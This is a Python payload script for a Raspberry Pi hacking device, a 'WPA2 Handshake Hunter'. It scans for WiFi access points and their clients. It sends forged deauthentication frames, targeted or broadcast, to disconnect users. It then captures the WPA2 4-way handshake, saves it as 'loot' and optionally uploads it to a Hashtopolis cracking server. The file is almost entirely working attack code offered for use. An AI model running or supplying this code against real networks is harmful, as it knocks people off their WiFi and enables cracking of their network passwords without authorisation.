#!/usr/bin/env python3
"""
RaspyJack Payload -- WPA2 Handshake Hunter
===========================================
Author: 7h30th3r0n3

Captures WPA2 4-way handshakes by scanning for APs, selecting a target,
discovering connected clients, sending targeted deauth, and capturing
the EAPOL exchange.  Saves as pcap file.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- pip install scapy (or apt install python3-scapy)
- apt install aircrack-ng

Controls:
  OK         -- Select AP / client
  UP / DOWN  -- Scroll list
  KEY1       -- Scan for APs
  KEY2       -- Export pcap to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/Handshakes/hs_YYYYMMDD_HHMMSS.pcap
"""

import os
import sys
import time
import json
import threading
import subprocess
from datetime import datetime
_RJ_BASE_DIR = os.environ.get("RJ_BASE_DIR") or os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
import rj_theme
from PIL import Image, ImageDraw
from payloads._display_helper import scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, supports_monitor

_T = rj_theme.EMBER_THEME

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeResp,
        RadioTap, EAPOL, sendp, sniff as scapy_sniff,
        wrpcap, raw, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 6
ROW_H = 12
LOOT_DIR = os.path.join(_RJ_BASE_DIR, 'loot', 'Handshakes')
CHANNELS_24 = list(range(1, 14))

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []         # [{bssid, essid, channel, signal}]
client_list = []     # [{mac, bssid}]
eapol_pkts = []      # raw captured EAPOL packets
captured_bssids = set()  # track captured BSSIDs for deduplication
handshake_count = 0
scroll = 0
selected_idx = 0
phase = "idle"       # idle | scanning | ap_select | client_scan | client_select | attacking | done
status_msg = ""
mon_iface = None
_running = True
_target_ap = None


# ---------------------------------------------------------------------------
# Onboard WiFi detection
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find a WiFi interface suitable for monitor mode."""
    candidates = []
    try:
        for name in os.listdir("/sys/class/net"):
            if name == "lo":
                continue
            if os.path.isdir(f"/sys/class/net/{name}/wireless"):
                if supports_monitor(name):
                    candidates.append(name)
    except Exception:
        pass
    no_mon = {"b43", "wl"}
    good, fallback = [], []
    for iface in candidates:
        drv = ""
        try:
            drv = os.path.basename(
                os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        except Exception:
            pass
        (fallback if drv in no_mon else good).append(iface)
    return (good or fallback or [None])[0]


def _monitor_up(iface):
    """Put iface into monitor mode. Returns monitor interface name or None."""
    for cmd in [
        ["nmcli", "device", "set", iface, "managed", "no"],
        ["sudo", "pkill", "-f", f"wpa_supplicant.*{iface}"],
        ["sudo", "pkill", "-f", f"dhcpcd.*{iface}"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass
    time.sleep(0.5)
    # Try iw first (works with Nexmon and most drivers)
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=10)
        subprocess.run(["sudo", "iw", iface, "set", "monitor", "none"],
                       capture_output=True, timeout=10)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=10)
        time.sleep(0.5)
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=5)
        if "type monitor" in r.stdout:
            return iface
    except Exception:
        pass
    # Fallback: airmon-ng (creates wlan0mon on some drivers)
    try:
        subprocess.run(["sudo", "airmon-ng", "start", iface],
                       capture_output=True, timeout=30)
        for name in (f"{iface}mon", iface):
            r = subprocess.run(["iw", "dev", name, "info"],
                               capture_output=True, text=True, timeout=5)
            if "type monitor" in r.stdout:
                return name
    except Exception:
        pass
    return None


def _monitor_down(iface):
    """Restore interface to managed mode."""
    if not iface:
        return
    base = iface.replace("mon", "")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", iface],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
        ["nmcli", "device", "set", base, "managed", "yes"],
    ]:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass


def _set_channel(iface, ch):
    """Set monitor interface to a specific channel."""
    try:
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                       capture_output=True, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Scan APs thread
# ---------------------------------------------------------------------------

def _scan_ap_thread(iface):
    """Scan all 2.4 GHz channels for APs."""
    global phase, status_msg
    found = {}

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            if not bssid:
                return
            bssid = bssid.upper()
            try:
                essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            except Exception:
                essid = "<hidden>"
            if not essid:
                essid = "<hidden>"
            sig = getattr(pkt, "dBm_AntSignal", -99)
            if bssid not in found:
                found[bssid] = {"bssid": bssid, "essid": essid,
                                "channel": 0, "signal": sig}

    for ch in CHANNELS_24:
        if not _running:
            break
        _set_channel(iface, ch)
        with lock:
            status_msg = f"Scanning ch {ch}/13..."
        try:
            scapy_sniff(iface=iface, prn=_handle, timeout=1.5, store=False)
        except Exception:
            pass
        for e in found.values():
            if e["channel"] == 0:
                e["channel"] = ch

    with lock:
        ap_list.clear()
        ap_list.extend(sorted(found.values(),
                              key=lambda a: a.get("signal", -99), reverse=True))
        phase = "ap_select" if ap_list else "idle"
        status_msg = f"Found {len(ap_list)} APs" if ap_list else "No APs found"


# ---------------------------------------------------------------------------
# Scan clients thread
# ---------------------------------------------------------------------------

def _scan_clients_thread(iface, target_bssid, target_ch):
    """Discover clients associated with target AP."""
    global phase, status_msg
    found = set()

    _set_channel(iface, target_ch)

    def _handle(pkt):
        if not _running or not pkt.haslayer(Dot11):
            return
        ds = pkt[Dot11].FCfield & 0x3
        src = pkt[Dot11].addr2
        dst = pkt[Dot11].addr1
        bss = pkt[Dot11].addr3
        if not src or not dst:
            return
        src, dst = src.upper(), dst.upper()
        bss_up = (bss or "").upper()
        tbss = target_bssid.upper()
        # Client sending to AP
        if bss_up == tbss and src != tbss and src != "FF:FF:FF:FF:FF:FF":
            found.add(src)
        # AP sending to client
        if bss_up == tbss and dst != tbss and dst != "FF:FF:FF:FF:FF:FF":
            found.add(dst)

    with lock:
        status_msg = "Sniffing clients..."

    try:
        scapy_sniff(iface=iface, prn=_handle, timeout=10, store=False)
    except Exception:
        pass

    with lock:
        client_list.clear()
        client_list.extend([{"mac": m, "bssid": target_bssid} for m in found])
        if client_list:
            phase = "client_select"
            status_msg = f"Found {len(client_list)} clients"
        else:
            phase = "ap_select"
            status_msg = "No clients found"


# ---------------------------------------------------------------------------
# Visual alert
# ---------------------------------------------------------------------------

def _flash_green_alert():
    """Flash an Obsidian Ember capture banner briefly to signal handshake capture."""
    try:
        lcd_tmp = LCD_1in44.LCD()
        lcd_tmp.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        w, h = lcd_tmp.width, lcd_tmp.height
        img = Image.new("RGB", (w, h), _T["ok_bg"])
        d = ImageDraw.Draw(img)
        d.rectangle((2, 2, w - 3, h - 3), outline=_T["ok"], width=3)
        rj_theme.draw_status_card(
            d, w, h, "HANDSHAKE CAPTURED!",
            sub="4-way EAPOL exchange complete",
            kind="ok", fonts=rj_theme.load_app_fonts(w, h),
        )
        lcd_tmp.LCD_ShowImage(img, 0, 0)
        time.sleep(0.3)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Deauth + Capture thread
# ---------------------------------------------------------------------------

def _attack_thread(iface, target_bssid, client_mac, target_ch):
    """Send deauth to client and capture EAPOL 4-way handshake."""
    global phase, status_msg, handshake_count
    _set_channel(iface, target_ch)

    eapol_msgs = {}  # key -> list of EAPOL packets

    def _handle(pkt):
        if not _running:
            return
        if pkt.haslayer(EAPOL):
            eapol_pkts.append(pkt)
            src = (pkt[Dot11].addr2 or "").upper() if pkt.haslayer(Dot11) else ""
            dst = (pkt[Dot11].addr1 or "").upper() if pkt.haslayer(Dot11) else ""
            pair_key = tuple(sorted([src, dst]))
            if pair_key not in eapol_msgs:
                eapol_msgs[pair_key] = []
            eapol_msgs[pair_key].append(pkt)

    stop_event = threading.Event()

    def _sniff_worker():
        try:
            scapy_sniff(iface=iface, prn=_handle, timeout=30, store=False,
                        stop_filter=lambda _: stop_event.is_set() or not _running)
        except Exception:
            pass

    sniff_t = threading.Thread(target=_sniff_worker, daemon=True)
    sniff_t.start()
    time.sleep(1)

    with lock:
        status_msg = "Sending deauth..."

    # Targeted deauth: client -> AP and AP -> client
    deauth1 = (RadioTap()
               / Dot11(addr1=client_mac, addr2=target_bssid,
                       addr3=target_bssid, type=0, subtype=12)
               / Dot11Deauth(reason=7))
    deauth2 = (RadioTap()
               / Dot11(addr1=target_bssid, addr2=client_mac,
                       addr3=target_bssid, type=0, subtype=12)
               / Dot11Deauth(reason=7))

    for burst in range(3):
        if not _running:
            break
        try:
            sendp(deauth1, iface=iface, count=5, inter=0.05, verbose=False)
            sendp(deauth2, iface=iface, count=5, inter=0.05, verbose=False)
        except Exception:
            pass
        with lock:
            status_msg = f"Deauth burst {burst + 1}/3, waiting..."
        time.sleep(3)

    with lock:
        status_msg = "Waiting for handshake..."

    deadline = time.time() + 15
    while time.time() < deadline and _running:
        for pair, msgs in eapol_msgs.items():
            if len(msgs) >= 4:
                stop_event.set()
                break
        if stop_event.is_set():
            break
        time.sleep(0.5)

    stop_event.set()
    sniff_t.join(timeout=3)

    # Count complete handshakes (4+ EAPOL messages for any pair)
    hs_count = sum(1 for msgs in eapol_msgs.values() if len(msgs) >= 4)

    with lock:
        handshake_count = hs_count
        if hs_count > 0:
            status_msg = f"Captured {hs_count} handshake(s)!"
            phase = "done"
            captured_bssids.add(target_bssid.upper())
        else:
            total_eapol = sum(len(m) for m in eapol_msgs.values())
            status_msg = f"No full HS ({total_eapol} EAPOL)"
            phase = "client_select"

    # Visual alert: flash green on capture
    if hs_count > 0:
        _flash_green_alert()


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _deduplicated_filename(bssid, essid):
    """Return a unique filename, appending a counter if a handshake for this
    BSSID+ESSID pair already exists in LOOT_DIR."""
    safe_essid = "".join(c if c.isalnum() or c in "-_" else "_" for c in essid)
    safe_bssid = bssid.replace(":", "")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"hs_{safe_bssid}_{safe_essid}_{ts}"
    candidate = os.path.join(LOOT_DIR, f"{base}.pcap")
    counter = 1
    while os.path.exists(candidate):
        candidate = os.path.join(LOOT_DIR, f"{base}_{counter}.pcap")
        counter += 1
    return candidate


def _export_loot():
    """Write captured EAPOL packets as pcap with deduplication."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    with lock:
        pkts = list(eapol_pkts)
        target = dict(_target_ap) if _target_ap else {}
    bssid = target.get("bssid", "UNKNOWN")
    essid = target.get("essid", "unknown")
    filepath = _deduplicated_filename(bssid, essid)
    if pkts:
        wrpcap(filepath, pkts)
    # Optionally upload to Hashtopolis in background
    threading.Thread(target=_hashtopolis_upload, args=(filepath,),
                     daemon=True).start()
    return os.path.basename(filepath)


HASHTOPOLIS_CONFIG = os.path.join(_RJ_BASE_DIR, 'loot', 'Hashtopolis', 'config.json')


def _hashtopolis_upload(filepath):
    """Upload pcap to Hashtopolis if config exists. Non-blocking."""
    global status_msg
    try:
        if not os.path.isfile(HASHTOPOLIS_CONFIG):
            return
        with open(HASHTOPOLIS_CONFIG, "r") as f:
            cfg = json.load(f)
        server_url = cfg.get("server_url", "").rstrip("/")
        api_key = cfg.get("api_key", "")
        if not server_url or not api_key:
            return
        with lock:
            status_msg = "Uploading to Hashtopolis..."
        import urllib.request
        import urllib.error
        boundary = "----RaspyJackBoundary"
        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            file_data = f.read()
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"apiKey\"\r\n\r\n"
            f"{api_key}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(
            f"{server_url}/api/upload",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            method="POST",
        )
        resp = urllib.request.urlopen(req, timeout=30)
        code = resp.getcode()
        with lock:
            status_msg = f"Upload OK ({code})" if code == 200 else f"Upload: {code}"
    except Exception as exc:
        with lock:
            status_msg = f"Upload fail: {str(exc)[:18]}"


# ---------------------------------------------------------------------------
# Display (native resolution-adaptive Obsidian Ember)
# ---------------------------------------------------------------------------

def _sig_pct(dbm):
    try:
        return max(0, min(100, int((int(dbm) + 95) * 100 / 55)))
    except Exception:
        return 0


def _sig_col(dbm):
    try:
        v = int(dbm)
    except Exception:
        return _T["danger"]
    if v >= -55:
        return _T["ok"]
    if v >= -72:
        return _T["warn"]
    return _T["danger"]


def _draw_frame(lcd, font):
    """Render current state to the LCD using Obsidian Ember adaptive layout."""
    w = int(getattr(lcd, "width", WIDTH) or WIDTH)
    h = int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)
    wide = fonts["wide"]
    large = fonts["large"]

    img = Image.new("RGB", (w, h), _T["bg_base"])
    d = ImageDraw.Draw(img)

    with lock:
        msg = status_msg
        aps = list(ap_list)
        clients = list(client_list)
        cur_phase = phase
        hs = handshake_count
        ep = len(eapol_pkts)
        cap_bssids = set(captured_bssids)
        tgt = dict(_target_ap) if _target_ap else None

    phase_badge = {
        "idle": "IDLE", "scanning": "SCAN", "ap_select": f"{len(aps)} APs",
        "client_scan": "CLIENTS", "client_select": f"{len(clients)} CLI",
        "attacking": "ATTACK", "done": f"HS:{hs}",
    }.get(cur_phase, cur_phase.upper())

    hdr_h = rj_theme.draw_app_header(
        d, w, "HANDSHAKE HUNTER", fonts,
        badge=phase_badge,
        right_text=msg if wide else "",
        right_pill=f"EAPOL:{ep}" if wide else "",
    )

    if cur_phase == "ap_select":
        hint = "Up/Dn:Nav  OK:Clients  K1:Rescan  K2:Export  K3:Exit" if wide else "OK:Sel K1:Scn K3:X"
    elif cur_phase == "client_select":
        hint = "Up/Dn:Nav  OK:Deauth One  K2:Deauth All  K1:Scan  K3:Exit" if wide else "OK:1 K2:All K3:X"
    elif cur_phase == "done":
        hint = "K2:Export PCAP  K1:Rescan  K3:Exit" if wide else "K2:Exp K1:Scn K3:X"
    else:
        hint = "K1:Scan APs   K2:Export   K3 / Esc:Exit" if wide else "K1:Scan K3:Exit"
    ftr_h = rj_theme.draw_app_footer(d, w, h, hint, fonts, right_text=mon_iface or "" if large else "")

    pad = 8 if large else (4 if wide else 2)
    y_top = hdr_h + pad
    y_bot = h - ftr_h - pad

    if not wide:
        d.text((pad + 2, y_top), rj_theme.truncate_text(d, msg, w - pad * 2 - 4, fonts["sub"]), font=fonts["sub"], fill=_T["warn"])
        y_top += 13 if h < 200 else 16

    if cur_phase == "ap_select":
        split = w >= 480
        lx0 = pad
        lx1 = int(w * 0.63) - pad // 2 if split else w - pad - (5 if len(aps) > 5 else 0)
        row_h = 28 if large else (22 if wide else (20 if h >= 200 else 13))
        vis = max(1, (y_bot - y_top) // row_h)
        start = max(0, min(selected_idx - vis // 2, max(0, len(aps) - vis)))

        for i in range(vis):
            idx = start + i
            if idx >= len(aps):
                break
            ap = aps[idx]
            y = y_top + i * row_h
            is_cur = idx == selected_idx
            is_cap = ap["bssid"].upper() in cap_bssids
            if is_cur:
                rj_theme.draw_card(
                    d, (lx0, y, lx1, y + row_h - 2),
                    fill=_T["select_bg"], outline=_T["border_accent"],
                    radius=4 if wide else 2, accent_left=_T["accent"], accent_width=3 if wide else 2,
                )
            elif i % 2 == 1 and wide:
                d.rectangle((lx0, y, lx1, y + row_h - 2), fill=_T["bg_surface"])

            ty = y + max(1, (row_h - (14 if large else (11 if wide else 9))) // 2)
            rx = lx1 - (8 if wide else 3)

            if is_cap and wide:
                pw, _ = rj_theme.draw_pill(
                    d, rx - 34, y + max(1, (row_h - 15) // 2), "HS", fonts["badge"],
                    bg=_T["ok_bg"], fg=_T["ok"], outline=_T["ok"], pad_x=4, pad_y=1,
                )
                rx -= pw + 5

            sig_h = 12 if large else (10 if wide else 8)
            sig_w = max(12, (sig_h // 5) * 4 + 8)
            sig = ap.get("signal", -99)
            rj_theme.draw_signal_bars(d, rx - sig_w, y + max(1, (row_h - sig_h) // 2), sig_h, _sig_pct(sig), active_color=_sig_col(sig))
            rx -= sig_w + (6 if wide else 3)

            ch_txt = f"CH{ap['channel']}" if wide else f"c{ap['channel']}"
            ch_w = rj_theme.measure_text(fonts["badge"], ch_txt, d)[2] + (8 if wide else 2)
            if wide:
                pw, _ = rj_theme.draw_pill(
                    d, rx - ch_w, y + max(1, (row_h - 15) // 2), ch_txt, fonts["badge"],
                    bg=_T["bg_elevated"], fg=_T["accent_bright"], outline=None, pad_x=4, pad_y=1,
                )
                rx -= pw + 6
            else:
                d.text((rx - ch_w, ty), ch_txt, font=fonts["sub"], fill=_T["accent_bright"])
                rx -= ch_w + 3

            tx = lx0 + (10 if wide else 4)
            fnt = fonts["body_bold"] if (is_cur and wide) else (fonts["body"] if wide else fonts["sub"])
            col = _T["ok"] if is_cap else (_T["text_bright"] if is_cur else _T["text_primary"])
            d.text((tx, ty), rj_theme.truncate_text(d, ap["essid"], max(20, rx - tx - 2), fnt), font=fnt, fill=col)

        if len(aps) > vis:
            rj_theme.draw_scrollbar(d, lx1 + 2 if split else w - 4, y_top, y_bot, start, vis, len(aps), width=3)

        if split and 0 <= selected_idx < len(aps):
            cur = aps[selected_idx]
            px0 = lx1 + 10
            rj_theme.draw_card(
                d, (px0, y_top, w - pad, y_bot),
                fill=_T["bg_surface"], outline=_T["border_subtle"],
                radius=8, accent_left=_T["ok"] if cur["bssid"].upper() in cap_bssids else _T["accent"], accent_width=4,
            )
            dx = px0 + 12
            dy = y_top + 12
            dmw = w - pad - dx - 8
            d.text((dx, dy), "TARGET AP", font=fonts["badge"], fill=_T["accent_bright"])
            dy += 20
            d.text((dx, dy), rj_theme.truncate_text(d, cur["essid"], dmw, fonts["title"]), font=fonts["title"], fill=_T["text_bright"])
            dy += 22
            d.text((dx, dy), cur["bssid"], font=fonts["mono"], fill=_T["text_muted"])
            dy += 22
            d.line([(dx, dy), (w - pad - 10, dy)], fill=_T["border_subtle"])
            dy += 12
            for k, v, c in [
                ("Channel", f"Ch {cur['channel']}", _T["accent_bright"]),
                ("Signal", f"{cur.get('signal', -99)} dBm", _sig_col(cur.get("signal", -99))),
                ("Status", "Captured" if cur["bssid"].upper() in cap_bssids else "Not captured", _T["ok"] if cur["bssid"].upper() in cap_bssids else _T["text_muted"]),
                ("EAPOL Pkts", str(ep), _T["warn"] if ep else _T["text_muted"]),
            ]:
                d.text((dx, dy), f"{k}:", font=fonts["sub"], fill=_T["text_muted"])
                d.text((dx + 74, dy), rj_theme.truncate_text(d, v, dmw - 74, fonts["body_bold"]), font=fonts["body_bold"], fill=c)
                dy += 22

    elif cur_phase == "client_select":
        if tgt:
            bar_h = 26 if large else (20 if wide else 13)
            rj_theme.draw_card(
                d, (pad, y_top, w - pad, y_top + bar_h),
                fill=_T["bg_surface"], outline=_T["border_subtle"],
                radius=4 if wide else 2, accent_left=_T["accent"], accent_width=3 if wide else 2,
            )
            d.text((pad + (10 if wide else 5), y_top + (5 if large else 2)),
                   rj_theme.truncate_text(d, f"AP: {tgt.get('essid', '?')}  (CH{tgt.get('channel', '?')})  -  {len(clients)} clients", w - pad * 2 - 14, fonts["body_bold"] if wide else fonts["sub"]),
                   font=fonts["body_bold"] if wide else fonts["sub"], fill=_T["accent_bright"])
            y_top += bar_h + (6 if wide else 3)

        row_h = 26 if large else (20 if wide else 13)
        vis = max(1, (y_bot - y_top) // row_h)
        start = max(0, min(selected_idx - vis // 2, max(0, len(clients) - vis)))
        for i in range(vis):
            idx = start + i
            if idx >= len(clients):
                break
            cl = clients[idx]
            y = y_top + i * row_h
            is_cur = idx == selected_idx
            if is_cur:
                rj_theme.draw_card(
                    d, (pad, y, w - pad - 5, y + row_h - 2),
                    fill=_T["select_bg"], outline=_T["border_accent"],
                    radius=4 if wide else 2, accent_left=_T["ok"], accent_width=3 if wide else 2,
                )
            ty = y + max(1, (row_h - (14 if large else (11 if wide else 9))) // 2)
            mac_txt = cl["mac"] if wide else cl["mac"][-11:]
            d.text((pad + (10 if wide else 4), ty), mac_txt, font=fonts["mono"] if wide else fonts["sub"], fill=_T["text_bright"] if is_cur else _T["text_primary"])
            if wide:
                lbl = "OK: Deauth target" if is_cur else "Station"
                lw = rj_theme.measure_text(fonts["sub"], lbl, d)[2]
                d.text((w - pad - lw - 12, ty + 1), lbl, font=fonts["sub"], fill=_T["ok"] if is_cur else _T["text_dim"])
        if len(clients) > vis:
            rj_theme.draw_scrollbar(d, w - 5, y_top, y_bot, start, vis, len(clients), width=3)

    elif cur_phase == "attacking":
        if w >= 480:
            kpi_h = 66
            gap = 8
            tw = (w - pad * 2 - gap * 2) // 3
            for idx_k, (lbl, val, acc) in enumerate([
                ("TARGET AP", (tgt.get("essid") if tgt else "?")[:18], _T["danger"]),
                ("EAPOL FRAMES", str(ep), _T["warn"]),
                ("HANDSHAKES", str(hs), _T["ok"] if hs else _T["accent"]),
            ]):
                kx = pad + idx_k * (tw + gap)
                rj_theme.draw_card(d, (kx, y_top, kx + tw, y_top + kpi_h), fill=_T["bg_surface"], outline=_T["border_subtle"], radius=6, accent_left=acc, accent_width=4)
                d.text((kx + 12, y_top + 10), lbl, font=fonts["badge"], fill=_T["text_muted"])
                d.text((kx + 12, y_top + 32), rj_theme.truncate_text(d, val, tw - 18, fonts["title"]), font=fonts["title"], fill=acc)
            rj_theme.draw_status_card(
                d, w, h + 56, "Deauth & EAPOL Sniff Active",
                sub=msg, kind="warn", foot=f"BSSID: {tgt.get('bssid', '-') if tgt else '-'}  |  CH {tgt.get('channel', '-') if tgt else '-'}",
                fonts=fonts,
            )
        else:
            rj_theme.draw_status_card(
                d, w, h, "Deauth + Capture",
                sub=f"{msg}  (EAPOL:{ep})", kind="warn",
                foot=tgt.get("essid", "") if tgt else "", fonts=fonts,
            )

    elif cur_phase == "done":
        rj_theme.draw_status_card(
            d, w, h, f"Captured {hs} Handshake(s)!",
            sub=f"EAPOL frames: {ep}  |  AP: {tgt.get('essid', '?') if tgt else '?'}",
            kind="ok", foot="Press KEY2 / F2 to export PCAP to loot", fonts=fonts,
        )

    else:
        rj_theme.draw_status_card(
            d, w, h,
            "Scanning..." if cur_phase in ("scanning", "client_scan") else "Handshake Hunter Ready",
            sub=msg,
            kind="warn" if cur_phase in ("scanning", "client_scan") else "info",
            foot="KEY1: Scan APs   KEY3: Exit",
            fonts=fonts,
        )

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, phase, scroll, selected_idx, status_msg, mon_iface
    global _target_ap

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()
    w, h = int(getattr(lcd, "width", WIDTH) or WIDTH), int(getattr(lcd, "height", HEIGHT) or HEIGHT)
    fonts = rj_theme.load_app_fonts(w, h)

    if not SCAPY_OK:
        img = Image.new("RGB", (w, h), _T["bg_base"])
        d = ImageDraw.Draw(img)
        rj_theme.draw_app_header(d, w, "HANDSHAKE HUNTER", fonts, badge="ERROR")
        rj_theme.draw_status_card(d, w, h, "Scapy Not Found", sub="Install python3-scapy", kind="err", fonts=fonts)
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    usb_iface = select_interface(lcd, font, PINS, GPIO, iface_type="wifi")
    if not usb_iface:
        GPIO.cleanup()
        return 1

    mon_iface = _monitor_up(usb_iface)
    if not mon_iface:
        img = Image.new("RGB", (w, h), _T["bg_base"])
        d = ImageDraw.Draw(img)
        rj_theme.draw_app_header(d, w, "HANDSHAKE HUNTER", fonts, badge="ERROR")
        rj_theme.draw_status_card(d, w, h, "Monitor Mode Failed", sub=f"Check dongle: {usb_iface}", kind="err", fonts=fonts)
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    status_msg = "Ready. KEY1 to scan."

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "KEY1" and phase not in ("scanning", "attacking", "client_scan"):
                phase = "scanning"
                scroll = 0
                selected_idx = 0
                threading.Thread(target=_scan_ap_thread, args=(mon_iface,),
                                 daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and phase == "ap_select":
                with lock:
                    if 0 <= selected_idx < len(ap_list):
                        _target_ap = dict(ap_list[selected_idx])
                if _target_ap:
                    phase = "client_scan"
                    scroll = 0
                    selected_idx = 0
                    threading.Thread(
                        target=_scan_clients_thread,
                        args=(mon_iface, _target_ap["bssid"],
                              _target_ap["channel"]),
                        daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and phase == "client_select":
                target_client = None
                with lock:
                    if 0 <= selected_idx < len(client_list):
                        target_client = dict(client_list[selected_idx])
                if target_client and _target_ap:
                    phase = "attacking"
                    threading.Thread(
                        target=_attack_thread,
                        args=(mon_iface, _target_ap["bssid"],
                              target_client["mac"], _target_ap["channel"]),
                        daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY2" and phase == "client_select":
                # Broadcast deauth -- deauth ALL clients at once
                if _target_ap:
                    phase = "attacking"
                    threading.Thread(
                        target=_attack_thread,
                        args=(mon_iface, _target_ap["bssid"],
                              "FF:FF:FF:FF:FF:FF", _target_ap["channel"]),
                        daemon=True).start()
                time.sleep(0.3)

            elif btn == "KEY2":
                with lock:
                    has_data = len(eapol_pkts) > 0
                if has_data:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved: {fname[:20]}"
                else:
                    with lock:
                        status_msg = "No data to export"
                time.sleep(0.3)

            elif btn == "UP":
                selected_idx = max(0, selected_idx - 1)
                if selected_idx < scroll:
                    scroll = selected_idx
                time.sleep(0.15)

            elif btn == "DOWN":
                with lock:
                    if phase == "ap_select":
                        total = len(ap_list)
                    elif phase == "client_select":
                        total = len(client_list)
                    else:
                        total = 0
                selected_idx = min(selected_idx + 1, max(0, total - 1))
                if selected_idx >= scroll + ROWS_VISIBLE:
                    scroll = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.15)

            _draw_frame(lcd, font)
            time.sleep(0.05)

    finally:
        _running = False
        _monitor_down(mon_iface)
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
